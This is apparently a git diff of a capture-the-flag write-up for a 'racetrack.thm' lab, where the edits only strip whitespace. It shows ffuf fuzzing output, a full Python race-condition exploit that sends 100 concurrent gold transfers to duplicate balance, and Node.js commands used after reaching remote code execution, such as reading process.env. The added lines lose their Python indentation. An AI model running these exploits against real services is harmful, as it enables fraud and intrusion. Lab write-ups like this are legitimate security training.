@@ -4,8 +4,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -21,43 +21,43 @@ We can create an account and login, let's fuzz to check more hidden directories:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://racetrack.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://racetrack.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .txt .git .js
+ :: Method : GET
+ :: URL : http://racetrack.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .txt .git .js
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-index.html              [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 417ms]
-home.html               [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 517ms]
-images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 577ms]
-login.html              [Status: 200, Size: 1815, Words: 602, Lines: 55, Duration: 240ms]
-Images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 239ms]
-Home.html               [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 196ms]
-purchase.html           [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 230ms]
-Index.html              [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 191ms]
-Login.html              [Status: 200, Size: 1815, Words: 602, Lines: 55, Duration: 199ms]
-create.html             [Status: 200, Size: 1973, Words: 620, Lines: 59, Duration: 196ms]
-giving.html             [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 203ms]
-IMAGES                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 211ms]
-INDEX.html              [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 206ms]
-HOME.html               [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 193ms]
-Purchase.html           [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 211ms]
-Create.html             [Status: 200, Size: 1973, Words: 620, Lines: 59, Duration: 193ms]
+index.html [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 417ms]
+home.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 517ms]
+images [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 577ms]
+login.html [Status: 200, Size: 1815, Words: 602, Lines: 55, Duration: 240ms]
+Images [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 239ms]
+Home.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 196ms]
+purchase.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 230ms]
+Index.html [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 191ms]
+Login.html [Status: 200, Size: 1815, Words: 602, Lines: 55, Duration: 199ms]
+create.html [Status: 200, Size: 1973, Words: 620, Lines: 59, Duration: 196ms]
+giving.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 203ms]
+IMAGES [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 211ms]
+INDEX.html [Status: 200, Size: 1542, Words: 514, Lines: 43, Duration: 206ms]
+HOME.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 193ms]
+Purchase.html [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 211ms]
+Create.html [Status: 200, Size: 1973, Words: 620, Lines: 59, Duration: 193ms]
 ```
 
 We got a bunch of stuff, `giving.html` is interesting, let's create a test account first:
@@ -158,101 +158,101 @@ init(autoreset=True)
 # ======== CONFIGURATION ========
 TARGET_HOST = "racetrack.thm"
 USERS = {
-    "acc1": "acc1",
-    "acc2": "acc2"
+ "acc1": "acc1",
+ "acc2": "acc2"
 }
 # ===============================
 
 def get_user_session(username, password):
-    """Retrieve session cookie and gold balance for authenticated user"""
-    payload = {"username": username, "password": password}
-    
-    with requests.Session() as session:
-        try:
-            # Authenticate and retrieve account data
-            response = session.post(
-                f"http://{TARGET_HOST}/api/login", 
-                data=payload,
-                timeout=5
-            )
-            response.raise_for_status()
-            
-            # Parse gold balance from HTML
-            soup = BeautifulSoup(response.text, "html.parser")
-            gold_element = soup.find("a", string=lambda text: "Gold:" in text if text else False)
-            
-            if gold_element:
-                gold_balance = int(gold_element.text.split(":")[1].strip())
-                print(f"{Fore.CYAN}[ðŸ’°] {Fore.GREEN}{username}{Style.RESET_ALL} balance: {Fore.YELLOW}{gold_balance} gold")
-                return session.cookies.get("connect.sid"), gold_balance
-            
-            raise ValueError("Gold balance element not found")
-            
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error retrieving {username} session: {e}")
-            return None, 0
+ """Retrieve session cookie and gold balance for authenticated user"""
+ payload = {"username": username, "password": password}
+ 
+ with requests.Session() as session:
+ try:
+ # Authenticate and retrieve account data
+ response = session.post(
+ f"http://{TARGET_HOST}/api/login", 
+ data=payload,
+ timeout=5
+ )
+ response.raise_for_status()
+ 
+ # Parse gold balance from HTML
+ soup = BeautifulSoup(response.text, "html.parser")
+ gold_element = soup.find("a", string=lambda text: "Gold:" in text if text else False)
+ 
+ if gold_element:
+ gold_balance = int(gold_element.text.split(":")[1].strip())
+ print(f"{Fore.CYAN}[ðŸ’°] {Fore.GREEN}{username}{Style.RESET_ALL} balance: {Fore.YELLOW}{gold_balance} gold")
+ return session.cookies.get("connect.sid"), gold_balance
+ 
+ raise ValueError("Gold balance element not found")
+ 
+ except Exception as e:
+ print(f"{Fore.RED}[!] Error retrieving {username} session: {e}")
+ return None, 0
 
 def transfer_gold(recipient, session_cookie, amount):
-    """Execute rapid gold transfer using asynchronous requests"""
-    print(f"\n{Fore.MAGENTA}[âž¤] Initiating transfer of {Fore.YELLOW}{amount} gold{Style.RESET_ALL} to {Fore.CYAN}{recipient}")
-    
-    headers = {
-        "Host": TARGET_HOST,
-        "Referer": f"http://{TARGET_HOST}/giving.html",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Cookie": f"connect.sid={session_cookie}"
-    }
-    
-    # Prepare batch of asynchronous requests
-    requests_list = [
-        grequests.post(
-            f"http://{TARGET_HOST}/api/givegold",
-            data=f"user={recipient}&amount={amount}",
-            headers=headers,
-            timeout=3
-        ) for _ in range(100)
-    ]
-    
-    # Execute all requests concurrently
-    grequests.map(requests_list)
-    print(f"{Fore.GREEN}[âœ“] Transfer completed!")
+ """Execute rapid gold transfer using asynchronous requests"""
+ print(f"\n{Fore.MAGENTA}[âž¤] Initiating transfer of {Fore.YELLOW}{amount} gold{Style.RESET_ALL} to {Fore.CYAN}{recipient}")
+ 
+ headers = {
+ "Host": TARGET_HOST,
+ "Referer": f"http://{TARGET_HOST}/giving.html",
+ "Content-Type": "application/x-www-form-urlencoded",
+ "Cookie": f"connect.sid={session_cookie}"
+ }
+ 
+ # Prepare batch of asynchronous requests
+ requests_list = [
+ grequests.post(
+ f"http://{TARGET_HOST}/api/givegold",
+ data=f"user={recipient}&amount={amount}",
+ headers=headers,
+ timeout=3
+ ) for _ in range(100)
+ ]
+ 
+ # Execute all requests concurrently
+ grequests.map(requests_list)
+ print(f"{Fore.GREEN}[âœ“] Transfer completed!")
 
 def execute_gold_race():
-    """Orchestrate gold transfer sequence between accounts"""
-    print(f"\n{Fore.BLUE}{Style.BRIGHT}ðŸ Starting Gold Race Exploitation ðŸ\n")
-    print(f"{Fore.MAGENTA}Target balance: {Fore.YELLOW}10,000 gold{Style.RESET_ALL}\n")
-    
-    total_gold = 0
-    cycle_count = 0
-    user_list = list(USERS.keys())
-    
-    while total_gold < 10000:
-        # Determine current sender/receiver pair
-        sender = user_list[cycle_count % 2]
-        receiver = user_list[(cycle_count + 1) % 2]
-        
-        print(f"{Fore.WHITE}{'â•'*50}")
-        print(f"{Fore.BLUE}[âš¡] Cycle #{cycle_count+1}: {sender} â†’ {receiver}")
-        
-        # Retrieve sender credentials and balance
-        session_id, current_gold = get_user_session(sender, USERS[sender])
-        total_gold = current_gold
-        
-        if current_gold > 0 and session_id:
-            transfer_gold(receiver, session_id, current_gold)
-        else:
-            print(f"{Fore.RED}[âœ—] Skipping transfer - insufficient gold or invalid session")
-        
-        cycle_count += 1
-    
-    print(f"\n{Fore.GREEN}{Style.BRIGHT}ðŸŽ‰ Exploit successful! Final balance: {total_gold} gold")
+ """Orchestrate gold transfer sequence between accounts"""
+ print(f"\n{Fore.BLUE}{Style.BRIGHT}ðŸ Starting Gold Race Exploitation ðŸ\n")
+ print(f"{Fore.MAGENTA}Target balance: {Fore.YELLOW}10,000 gold{Style.RESET_ALL}\n")
+ 
+ total_gold = 0
+ cycle_count = 0
+ user_list = list(USERS.keys())
+ 
+ while total_gold < 10000:
+ # Determine current sender/receiver pair
+ sender = user_list[cycle_count % 2]
+ receiver = user_list[(cycle_count + 1) % 2]
+ 
+ print(f"{Fore.WHITE}{'â•'*50}")
+ print(f"{Fore.BLUE}[âš¡] Cycle #{cycle_count+1}: {sender} â†’ {receiver}")
+ 
+ # Retrieve sender credentials and balance
+ session_id, current_gold = get_user_session(sender, USERS[sender])
+ total_gold = current_gold
+ 
+ if current_gold > 0 and session_id:
+ transfer_gold(receiver, session_id, current_gold)
+ else:
+ print(f"{Fore.RED}[âœ—] Skipping transfer - insufficient gold or invalid session")
+ 
+ cycle_count += 1
+ 
+ print(f"\n{Fore.GREEN}{Style.BRIGHT}ðŸŽ‰ Exploit successful! Final balance: {total_gold} gold")
 
 if __name__ == "__main__":
-    print(f"\n{Fore.YELLOW}{Style.BRIGHT}ðŸŒŸ Gold Transfer Exploit v2.0")
-    print(f"{Fore.CYAN}Target: {TARGET_HOST}")
-    print(f"{Fore.MAGENTA}Accounts: {', '.join(USERS.keys())}\n")
-    
-    execute_gold_race()
+ print(f"\n{Fore.YELLOW}{Style.BRIGHT}ðŸŒŸ Gold Transfer Exploit v2.0")
+ print(f"{Fore.CYAN}Target: {TARGET_HOST}")
+ print(f"{Fore.MAGENTA}Accounts: {', '.join(USERS.keys())}\n")
+ 
+ execute_gold_race()
 ```
 
 In order for the script to work we need to create two new accounts to get the `1 gold`, once you have them, run the script:
@@ -341,16 +341,16 @@ This command checks the current working directory, once we use it we get:
 As seen, we have RCE, we can use more commands to test:
 
 ```
-process.cwd()                          // Current working directory
-process.version                        // Node.js version
-process.versions                       // Node + dependency versions
-process.platform                       // OS platform ('linux', 'win32', etc.)
-process.arch                           // Architecture ('x64', etc.)
-process.env                            // Environment variables object
-process.env['PATH']                   // Specific env var (e.g., PATH)
-process.argv                           // Script arguments (if any)
-process.uptime()                       // Time Node has been running
-process.memoryUsage()                 // Memory info
+process.cwd() // Current working directory
+process.version // Node.js version
+process.versions // Node + dependency versions
+process.platform // OS platform ('linux', 'win32', etc.)
+process.arch // Architecture ('x64', etc.)
+process.env // Environment variables object
+process.env['PATH'] // Specific env var (e.g., PATH)
+process.argv // Script arguments (if any)
+process.uptime() // Time Node has been running
+process.memoryUsage() // Memory info
 ```
 
 
